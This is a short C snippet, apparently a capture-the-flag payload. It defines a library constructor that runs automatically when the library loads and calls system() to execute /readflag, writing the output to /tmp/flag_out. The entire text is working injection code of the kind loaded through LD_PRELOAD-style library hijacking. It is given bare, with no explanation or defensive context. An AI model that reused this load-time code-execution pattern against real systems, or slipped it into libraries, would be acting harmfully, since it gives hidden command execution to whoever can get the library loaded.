#include <stdlib.h>
    __attribute__((constructor)) void init()
    { 
        system("/readflag > /tmp/flag_out"); 
    }